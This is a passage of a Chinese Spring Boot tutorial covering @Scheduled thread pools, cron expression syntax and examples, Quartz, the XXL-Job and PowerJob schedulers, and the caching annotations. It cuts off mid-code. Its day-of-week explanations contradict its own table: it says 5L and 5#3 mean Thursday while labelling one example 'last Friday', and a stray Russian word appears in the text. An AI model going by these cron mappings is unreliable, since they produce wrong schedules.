class="params">(ScheduledTaskRegistrar taskRegistrar)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个包含10个线程的线程池</span></span><br><span class="line">        taskRegistrar.setScheduler(Executors.newScheduledThreadPool(<span class="number">10</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这个配置，所有的 <code>@Scheduled</code> 任务就会在这个容量为10的线程池中并发执行。</p>
<hr>
<h3 id="1-2-Cron-表达式"><a href="#1-2-Cron-表达式" class="headerlink" title="1.2 Cron 表达式"></a>1.2 Cron 表达式</h3><p><code>@Scheduled</code> 注解中的 <code>fixedRate</code> 和 <code>fixedDelay</code> 适用于简单的、固定间隔的调度。但对于更复杂的业务场景，例如“每个工作日的上午10点”、“每个月最后一天”或“每季度第一个周一”，我们就需要使用 Cron 表达式。</p>
<p>Cron 表达式是一个字符串，由 6 到 7 个由空格分隔的字段组成，它精确地定义了任务触发的时间规则。</p>
<h4 id="1-2-1-Cron-表达式的语法结构"><a href="#1-2-1-Cron-表达式的语法结构" class="headerlink" title="1.2.1 Cron 表达式的语法结构"></a>1.2.1 Cron 表达式的语法结构</h4><p>Spring 的 Cron 表达式包含 6 个必填字段，其顺序和含义如下：</p>
<table>
<thead>
<tr>
<th align="left">位置</th>
<th align="left">字段</th>
<th align="left">允许值</th>
<th align="left">允许的特殊字符</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>秒 (Second)</strong></td>
<td align="left"><code>0-59</code></td>
<td align="left"><code>* , - /</code></td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>分 (Minute)</strong></td>
<td align="left"><code>0-59</code></td>
<td align="left"><code>* , - /</code></td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>时 (Hour)</strong></td>
<td align="left"><code>0-23</code></td>
<td align="left"><code>* , - /</code></td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>日 (Day of Month)</strong></td>
<td align="left"><code>1-31</code></td>
<td align="left"><code>* , - / ? L W</code></td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><strong>月 (Month)</strong></td>
<td align="left"><code>1-12</code> 或 <code>JAN-DEC</code></td>
<td align="left"><code>* , - /</code></td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><strong>周 (Day of Week)</strong></td>
<td align="left"><code>1-7</code> 或 <code>MON-SUN</code></td>
<td align="left"><code>* , - / ? L #</code></td>
</tr>
</tbody></table>
<blockquote>
<p><strong>重要提示</strong>：在 “日 (Day of Month)” 和 “周 (Day of Week)” 字段中，通常必须有一个使用 <code>?</code> 来表示“不指定”，以避免冲突。例如，你不能同时指定“每月的15号”并且“是周五”。</p>
</blockquote>
<hr>
<h4 id="1-2-2-特殊字符详解"><a href="#1-2-2-特殊字符详解" class="headerlink" title="1.2.2 特殊字符详解"></a>1.2.2 特殊字符详解</h4><table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">名称</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>*</code></td>
<td align="left">星号 (任意值)</td>
<td align="left">代表该字段的每一个可能的值。例如，在“分”字段中表示“每分钟”。</td>
</tr>
<tr>
<td align="left"><code>?</code></td>
<td align="left">问号 (不指定)</td>
<td align="left">仅用于“日”和“周”字段。当其中一个字段被指定了值，另一个字段就应该使用 <code>?</code> 来表示不关心。</td>
</tr>
<tr>
<td align="left"><code>-</code></td>
<td align="left">减号 (范围)</td>
<td align="left">指定一个范围。例如，在“时”字段中使用 <code>10-12</code> 表示 10点、11点和12点。</td>
</tr>
<tr>
<td align="left"><code>,</code></td>
<td align="left">逗号 (列表)</td>
<td align="left">指定一个值的列表。例如，在“周”字段中使用 <code>MON,WED,FRI</code> 表示周一、周三和周五。</td>
</tr>
<tr>
<td align="left"><code>/</code></td>
<td align="left">斜杠 (步长)</td>
<td align="left">指定增量。例如，在“秒”字段中使用 <code>0/15</code> 表示从第0秒开始，每隔15秒执行一次（即 0, 15, 30, 45秒）。</td>
</tr>
<tr>
<td align="left"><code>L</code></td>
<td align="left">Last (最后)</td>
<td align="left">仅用于“日”和“周”字段。<br/>- 在“日”字段中，<code>L</code> 表示这个月的最后一天（31、30、29或28）。<br/>- 在“周”字段中，<code>L</code> 表示一周的最后一天（即周六 <code>SAT</code> 或 <code>7</code>）。<code>5L</code> 则表示这个月最后一个周四。</td>
</tr>
<tr>
<td align="left"><code>W</code></td>
<td align="left">Weekday (工作日)</td>
<td align="left">仅用于“日”字段。<code>15W</code> 表示离15号最近的那个工作日（周一到周五）。如果15号是周六，则在14号（周五）触发；如果15号是周日，则在16号（周一）触发。<code>LW</code> 组合表示这个月最后一个工作日。</td>
</tr>
<tr>
<td align="left"><code>#</code></td>
<td align="left">井号 (第几个)</td>
<td align="left">仅用于“周”字段。<code>5#3</code> 表示这个月的第三个星期四。</td>
</tr>
</tbody></table>
<hr>
<h4 id="1-2-3-常见-Cron-表达式示例"><a href="#1-2-3-常见-Cron-表达式示例" class="headerlink" title="1.2.3 常见 Cron 表达式示例"></a>1.2.3 常见 Cron 表达式示例</h4><p>下面是一些实际应用中的例子，可以直接在 <code>@Scheduled</code> 注解中使用。</p>
<p><strong>示例1：每分钟的第30秒执行</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Scheduled(cron = &quot;30 * * * * ?&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">task1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>示例2：每天凌晨 1:00 整执行</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 秒 分 时 日 月 周</span></span><br><span class="line"><span class="meta">@Scheduled(cron = &quot;0 0 1 * * ?&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">task2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>示例3：每个工作日 (周一至周五) 的上午 10:15 执行</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Scheduled(cron = &quot;0 15 10 ? * MON-FRI&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">task3</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>示例4：每个月1号、11号、21号的凌晨 2:00 执行</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Scheduled(cron = &quot;0 0 2 1,11,21 * ?&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">task4</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>示例5：每隔 5 分钟执行一次</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Scheduled(cron = &quot;0 0/5 * * * ?&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">task5</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>示例6：每个月最后一个周五的晚上 10:00 执行</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Scheduled(cron = &quot;0 0 22 ? * 5L&quot;)</span> <span class="comment">// 5L 表示最后一个周四</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">task6</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="1-2-4-使用技巧与注意事项"><a href="#1-2-4-使用技巧与注意事项" class="headerlink" title="1.2.4 使用技巧与注意事项"></a>1.2.4 使用技巧与注意事项</h4><ul>
<li><p><strong>在线生成器：</strong> 对于复杂的 Cron 表达式，强烈建议使用在线 Cron 表达式生成和校验工具 (如 Cron Maker, Crontab Guru)。这可以有效避免手动编写错误。</p>
</li>
<li><p><strong>时区问题 (Time Zone)：</strong> Spring 的 <code>@Scheduled</code> 默认使用服务器的本地时区。如果你的应用需要基于特定时区进行调度（例如，所有任务都按 <code>UTC+8</code> 执行），可以在注解中指定 <code>zone</code> 属性。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Scheduled(cron = &quot;0 0 1 * * ?&quot;, zone = &quot;Asia/Shanghai&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">taskInSpecificTimeZone</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 这个任务总是在北京时间凌晨1点执行，无论服务器在哪个时区</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>代码可读性：</strong> 复杂的 Cron 表达式会降低代码的可读性。建议在 <code>@Scheduled</code> 注解上方添加一行注释，用自然语言解释该表达式的含义。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Execute at 10:15 AM every weekday</span></span><br><span class="line"><span class="meta">@Scheduled(cron = &quot;0 15 10 ? * MON-FRI&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendDailyReport</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>配置化：</strong> 在生产环境中，将 Cron 表达式配置在 <code>application.properties</code> 或 <code>application.yml</code> 中是更好的实践，这样可以在不重新编译和部署代码的情况下调整任务执行时间。</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># application.properties</span></span><br><span class="line"><span class="attr">myapp.scheduling.report-task.cron</span>=<span class="string">0 15 10 ? * MON-FRI</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Scheduled(cron = &quot;$&#123;myapp.scheduling.report-task.cron&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendDailyReport</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="1-3-动态与分布式调度"><a href="#1-3-动态与分布式调度" class="headerlink" title="1.3 动态与分布式调度"></a>1.3 动态与分布式调度</h3><p>虽然 <code>@Scheduled</code> 注解非常方便，但它存在一些固有的局限性，尤其是在现代化的、可扩展的应用程序中：</p>
<ol>
<li><strong>静态性 (Static Nature):</strong> 任务的触发规则（如 Cron 表达式）通常硬编码在代码或配置文件中。如果需要修改执行时间、暂停任务或新增任务，必须修改代码、重新打包并部署应用，缺乏灵活性。</li>
<li><strong>单点问题 (Single Point of Execution):</strong> 在分布式环境中，如果将应用部署为多个实例（集群），每个实例都会独立执行相同的 <code>@Scheduled</code> 任务，这会导致任务被重复执行，可能引发数据错乱或资源浪费。</li>
<li><strong>功能局限 (Limited Functionality):</strong> <code>@Scheduled</code> 缺少一些高级的企业级功能，如：<ul>
<li>可视化的管理和监控界面。</li>
<li>失败重试、任务依赖、历史日志查询。</li>
<li>任务分片（将一个大任务拆分给多个节点执行）。</li>
<li>故障转移（一个节点宕机后，任务自动由其他节点接管）。</li>
</ul>
</li>
</ol>
<p>为了解决这些问题，我们需要引入更专业的调度框架，它们主要分为两大类：<strong>企业级调度框架（如 Quartz）</strong> 和 <strong>分布式任务调度中心（如 XXL-Job, PowerJob）</strong>。</p>
<hr>
<h4 id="1-3-1-Quartz：强大的企业级调度框架"><a href="#1-3-1-Quartz：强大的企业级调度框架" class="headerlink" title="1.3.1 Quartz：强大的企业级调度框架"></a>1.3.1 Quartz：强大的企业级调度框架</h4><p>Quartz 是一个功能丰富、历史悠久的开源作业调度库，可以紧密集成在 Java 应用中。你可以把它看作是 Spring 内置调度的“超级增强版”。</p>
<p><strong>核心概念:</strong></p>
<ul>
<li><strong><code>Scheduler</code>：</strong> 调度器核心，负责管理和触发任务。</li>
<li><strong><code>Job</code>：</strong> 一个接口，定义了需要被执行的具体业务逻辑。</li>
<li><strong><code>Trigger</code>：</strong> 触发器，定义了 <code>Job</code> 何时被执行（例如，使用 <code>CronTrigger</code> 或 <code>SimpleTrigger</code>）。</li>
<li><strong><code>JobDetail</code>：</strong> <code>Job</code> 的实例，包含了 <code>Job</code> 的身份信息（名称、组）和相关的状态数据 (<code>JobDataMap</code>)。</li>
</ul>
<p><strong>关键特性:</strong></p>
<ol>
<li><strong>持久化 (Persistence):</strong> Quartz 可以将任务（<code>Job</code> 和 <code>Trigger</code>）的信息存储在数据库中。这样即使应用重启，之前定义的任务也不会丢失，保证了任务的可靠性。</li>
<li><strong>动态管理 (Dynamic Management):</strong> 你可以通过代码（API调用）在运行时动态地创建、修改、暂停、恢复和删除任务，而无需重启服务。这解决了 <code>@Scheduled</code> 的静态性问题。</li>
<li><strong>集群支持 (Clustering):</strong> Quartz 支持集群模式。多个应用实例可以连接到同一个数据库，Quartz 通过数据库锁机制来确保在同一时刻，一个任务只会被集群中的一个节点执行，从而避免了任务重复执行的问题。</li>
<li><strong>丰富的触发器:</strong> 除了 Cron 触发器，还支持 <code>SimpleTrigger</code>（在指定时间点执行，可设置重复次数和间隔）等多种触发方式。</li>
</ol>
<p><strong>与 Spring Boot 集成:</strong></p>
<p>通过引入 <code>spring-boot-starter-quartz</code> 依赖，可以非常方便地将 Quartz 集成到 Spring Boot 项目中。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-quartz<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="1-3-2-分布式任务调度中心"><a href="#1-3-2-分布式任务调度中心" class="headerlink" title="1.3.2 分布式任务调度中心"></a>1.3.2 分布式任务调度中心</h4><p>对于微服务架构或大规模分布式系统，更好的选择是使用一个独立的、可视化的<strong>分布式任务调度中心</strong>。</p>
<p>这种架构将 <strong>调度器 (Scheduler)</strong> 和 <strong>执行器 (Executor)</strong> 分离开来：</p>
<ul>
<li><strong>调度中心 (Scheduler Center):</strong> 一个独立的、高可用的服务。它负责任务的统一管理（增删改查）、触发、监控、路由和故障转移。通常提供一个 Web 管理界面。</li>
<li><strong>执行器 (Executor):</strong> 通常是一个轻量级的 Agent 或 SDK，内嵌在你的业务应用中。它负责接收来自调度中心的指令，并执行具体的业务代码。</li>
</ul>
<p><strong>主流框架:</strong></p>
<ul>
<li><strong>XXL-Job:</strong> 由大众点评开源，是一个轻量级、易于上手的分布式任务调度平台。它功能完善，社区活跃，在国内被广泛使用。</li>
<li><strong>PowerJob:</strong> 新一代分布式计算与任务调度框架，功能更强大，支持 DAG（有向无环图）任务编排、MapReduce、任务分片等高级特性。</li>
</ul>
<p><strong>核心优势:</strong></p>
<ol>
<li><strong>可视化管理:</strong> 提供统一的 Web 界面，可以方便地管理所有任务、查看执行日志、监控执行器状态等，运维非常友好。</li>
<li><strong>高可用与解耦:</strong> 调度中心和业务应用完全解耦。调度中心可以独立部署为高可用集群，业务应用的扩缩容或宕机不影响调度中心的稳定性。</li>
<li><strong>强大的分布式特性:</strong><ul>
<li><strong>路由策略:</strong> 可以灵活地选择哪个执行器实例来运行任务（如轮询、随机、故障转移、分片广播等）。</li>
<li><strong>任务分片:</strong> 可以将一个海量数据处理任务平均分配给多个执行器实例并行处理，极大提升处理效率。</li>
<li><strong>故障转移:</strong> 当某个执行器节点宕机时，调度中心能自动将任务 перенаправить (redirect) 到其他健康的节点上执行。</li>
<li><strong>生命周期管理:</strong> 完善的任务生命周期管理，包括任务超时控制、失败告警、执行日志追踪等。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="1-3-3-总结与选型对比"><a href="#1-3-3-总结与选型对比" class="headerlink" title="1.3.3 总结与选型对比"></a>1.3.3 总结与选型对比</h4><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left"><code>@Scheduled</code> (Spring 内置)</th>
<th align="left">Quartz (企业级框架)</th>
<th align="left">分布式调度中心 (XXL-Job&#x2F;PowerJob)</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>易用性</strong></td>
<td align="left"><strong>极高</strong> (一个注解搞定)</td>
<td align="left">较高 (需要理解核心概念)</td>
<td align="left">中等 (需要部署调度中心和集成执行器)</td>
</tr>
<tr>
<td align="left"><strong>动态管理</strong></td>
<td align="left">不支持 (需重启)</td>
<td align="left"><strong>支持</strong> (通过 API 动态管理)</td>
<td align="left"><strong>核心特性</strong> (通过 Web 界面管理)</td>
</tr>
<tr>
<td align="left"><strong>分布式支持</strong></td>
<td align="left">不支持 (会重复执行)</td>
<td align="left">支持集群模式 (通过DB锁)</td>
<td align="left"><strong>核心特性</strong> (原生分布式设计)</td>
</tr>
<tr>
<td align="left"><strong>监控与管理</strong></td>
<td align="left">无</td>
<td align="left">弱 (需自行实现)</td>
<td align="left"><strong>强大</strong> (提供统一的可视化管理后台)</td>
</tr>
<tr>
<td align="left"><strong>高级功能</strong></td>
<td align="left">无 (失败重试、分片等)</td>
<td align="left">有限支持</td>
<td align="left"><strong>非常丰富</strong> (分片、路由、故障转移、依赖)</td>
</tr>
<tr>
<td align="left"><strong>架构</strong></td>
<td align="left">内嵌在应用中</td>
<td align="left">内嵌在应用中 (可配置DB持久化)</td>
<td align="left"><strong>调度与执行分离</strong></td>
</tr>
<tr>
<td align="left"><strong>适用场景</strong></td>
<td align="left">单体应用、简单的后台任务</td>
<td align="left">复杂的单体应用、需要动态管理任务的场景</td>
<td align="left"><strong>微服务架构、大规模分布式系统</strong>、复杂任务编排</td>
</tr>
</tbody></table>
<hr>
<h2 id="2-缓存抽象-Caching-Abstraction"><a href="#2-缓存抽象-Caching-Abstraction" class="headerlink" title="2. 缓存抽象 (Caching Abstraction)"></a>2. 缓存抽象 (Caching Abstraction)</h2><p>Spring 缓存抽象的目标是提供一个统一的、与具体缓存技术无关的编程模型。开发者只需通过简单的注解，就能将缓存逻辑透明地集成到现有代码中，而无需关心底层使用的是 Redis、Caffeine 还是其他缓存实现。这极大地实现了<strong>业务逻辑与缓存逻辑的解耦</strong>。</p>
<p>与任务调度类似，使用缓存注解前，必须在 Spring Boot 的主启动类或任何配置类（<code>@Configuration</code>）上添加 <code>@EnableCaching</code> 注解。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cache.annotation.EnableCaching;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableCaching</span> <span class="comment">// 开启基于注解的缓存功能</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(MyApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-1-核心注解"><a href="#2-1-核心注解" class="headerlink" title="2.1 核心注解"></a>2.1 核心注解</h3><h4 id="2-1-1-Cacheable：查询缓存"><a href="#2-1-1-Cacheable：查询缓存" class="headerlink" title="2.1.1 @Cacheable：查询缓存"></a>2.1.1 <code>@Cacheable</code>：查询缓存</h4><ul>
<li><strong>作用：</strong> 这是最常用的缓存注解。在方法执行前，Spring 会先根据 <code>key</code> 检查缓存中是否存在对应的数据。<ul>
<li><strong>如果缓存存在</strong>：直接返回缓存中的数据，<strong>方法体内的代码不会被执行</strong>。</li>
<li><strong>如果缓存不存在</strong>：执行方法，并将方法的返回值存入缓存，然后返回结果。</li>
</ul>
</li>
<li><strong>适用场景：</strong> 主要用于数据<strong>查询</strong>操作，对于读多写少的场景效果显著。</li>
<li><strong>常用属性：</strong><ul>
<li><code>value</code> &#x2F; <code>cacheNames</code>：指定要使用的缓存名称（可以是一个或多个）。例如，<code>cacheNames = &quot;users&quot;</code>。</li>
<li><code>key</code>：缓存的键。这是缓存中数据的唯一标识。支持使用 <strong>SpEL (Spring Expression Language)</strong> 动态生成。<ul>
<li>如果省略，Spring 会使用默认策略生成 key（通常是方法的参数组合）。</li>
<li><strong>强烈建议手动指定 <code>key</code></strong> 以保证其唯一性和可读性。</li>
</ul>
</li>
<li><code>condition</code>：条件成立时才进行缓存。SpEL 表达式，返回 <code>true</code> 时缓存，<code>false</code> 则不缓存。例如 <code>condition = &quot;#id &gt; 0&quot;</code>。</li>
<li><code>unless</code>：条件成立时<strong>不</strong>缓存方法的返回值。用于否决缓存，例如 <code>unless = &quot;#result == null&quot;</code>，表示如果方法返回 <code>null</code>，则不缓存。</li>
</ul>
</li>
<li><strong>代码示例：</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.cache.annotation.Cacheable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 假设这是从数据库查询的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Cacheable(cacheNames = &quot;users&quot;, key = &quot;#id&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">findById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Executing findById from DB for ID: &quot;</span> + id);</span><br><span class="line">        <span class="comment">// 模拟数据库查询</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>(id, <span class="string">&quot;User&quot;</span> + id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>调用分析</strong>：</p>
<ul>
<li>第一次调用 <code>findById(1L)</code>：控制台打印 “Executing findById from DB…”，方法执行，返回值被存入名为 “users” 的缓存中，key 为 “1”。</li>
<li>第二次调用 <code>findById(1L)</code>：直接从缓存返回数据，控制台<strong>不会</strong>有任何打印，方法体未被执行。</li>
</ul>
</blockquote>
<hr>
<h4 id="2-1-2-CachePut：更新缓存"><a href="#2-1-2-CachePut：更新缓存" class="headerlink" title="2.1.2 @CachePut：更新缓存"></a>2.1.2 <code>@CachePut</code>：更新缓存</h4><ul>
<li><strong>作用：</strong> 与 <code>@Cacheable</code> 不同，<code>@CachePut</code> 会<strong>始终执行方法体</strong>，然后将方法的返回值更新（或放入）到缓存中。</li>
<li><strong>适用场景：</strong> 主要用于数据<strong>更新</strong>操作。它确保了在更新数据库的同时，也更新了缓存中的数据，保持数据一致性。</li>
<li><strong>常用属性：</strong><ul>
<li><code>value</code> &#x2F; <code>cacheNames</code>：同上。</li>
<li><code>key</code>：必须指定，且通常需要与查询时（<code>@Cacheable</code>）使用的 <code>key</code> 保持一致，这样才能正确更新同一条数据。</li>
</ul>
</li>
<li><strong>代码示例：</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.cache.annotation.CachePut;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@CachePut(cacheNames = &quot;users&quot;, key = &quot;#user.id&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">updateUser</span><span class="params">(User user)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Executing updateUser in DB for user: &quot;</span> + user.getId());</span><br><span class="line">        <span class="comment">// 模拟更新数据库</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">return</span> user; <span class="comment">// 返回更新后的对象，该对象将被放入缓存</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>调用分析</strong>：每次调用 <code>updateUser(user)</code>，控制台<strong>总是</strong>会打印 “Executing updateUser…”，并且缓存 “users” 中对应 key 的数据会被更新为方法返回的新 <code>user</code> 对象。</p>
</blockquote>
<hr>
<h4 id="2-1-3-CacheEvict：失效缓存"><a href="#2-1-3-CacheEvict：失效缓存" class="headerlink" title="2.1.3 @CacheEvict：失效缓存"></a>2.1.3 <code>@CacheEvict</code>：失效缓存</h4><ul>
<li><strong>作用：</strong> 从缓存中移除一条或多条数据。</li>
<li><strong>适用场景：</strong> 主要用于数据<strong>删除</strong>操作，或在某些更新操作后需要清除相关缓存的场景。</li>
<li><strong>常用属性：</strong><ul>
<li><code>value</code> &#x2F; <code>cacheNames</code>：同上。</li>
<li><code>key</code>：指定要移除的缓存键。</li>
<li><code>allEntries</code>：布尔值，默认为 <code>false</code>。如果设置为 <code>true</code>，则会清空整个缓存（<code>cacheNames</code> 指定的那个），而不仅仅是移除某个 <code>key</code> 对应的数据。</li>
<li><code>beforeInvocation</code>：布尔值，默认为 <code>false</code>。<ul>
<li><code>false</code>（默认）：在方法成功执行<strong>之后</strong>才清除缓存。如果方法执行失败并抛出异常，缓存不会被清除，保证了数据一致性。</li>
<li><code>true</code>：在方法执行<strong>之前</strong>就清除缓存。这种方式存在风险，如果方法后续执行失败，会导致缓存已删但数据未删的不一致状态。</li>
</ul>
</li>
</ul>
</li>
<li><strong>代码示例：</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.cache.annotation.CacheEvict;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span 